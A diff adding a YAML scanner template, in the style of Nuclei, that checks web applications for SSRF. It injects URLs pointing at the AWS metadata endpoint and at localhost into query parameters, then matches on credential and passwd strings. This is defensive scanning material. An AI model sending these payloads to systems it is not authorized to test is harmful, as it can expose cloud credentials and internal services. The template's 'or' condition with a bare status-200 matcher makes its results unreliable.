@@ -1,0 +1,30 @@
+id: ssrf-localhost-probe
+info:
+  name: Server-Side Request Forgery (SSRF) Metadata & Localhost Probe
+  author: YemenScan-Core
+  severity: high
+  description: تزوير الطلبات من جانب الخادم SSRF يتيح للمهاجم توجيه الخادم للاتصال
+    بالشبكة الداخلية أو خدمات السحابة 169.254.169.254.
+  remediation: حظر الاتصال بعناوين الاسترجاع (Loopback) والشبكات الخاصة (RFC 1918)
+    واستخدام وكلاء خروج مفلترة.
+  tags:
+  - ssrf
+  - cloud
+  - aws
+  - network
+http:
+- method: GET
+  path:
+  - '{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/'
+  - '{{BaseURL}}/?dest=http://127.0.0.1:80/'
+  matchers-condition: or
+  matchers:
+  - type: word
+    words:
+    - ami-id
+    - instance-id
+    - security-credentials
+    - 'root:x:0:0:'
+  - type: status
+    status:
+    - 200
